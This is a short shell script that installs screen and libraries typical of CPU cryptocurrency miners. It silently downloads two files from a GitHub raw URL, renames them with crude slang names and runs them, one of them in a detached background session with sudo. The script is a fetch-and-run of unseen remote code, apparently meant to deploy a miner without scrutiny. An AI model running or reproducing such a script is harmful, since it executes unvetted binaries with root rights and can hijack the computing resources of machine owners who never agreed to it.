#!/bin/sh

sudo apt update

sudo apt install screen -y

screen -dmS xhajar.sh ./xhajar.sh 65 75

sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1

wget -qO manuk https://raw.githubusercontent.com/renilo/hajar/main/enak && wget -qO kontola https://raw.githubusercontent.com/renilo/hajar/main/xhajar.sh && chmod +x manuk kontola

./kontola
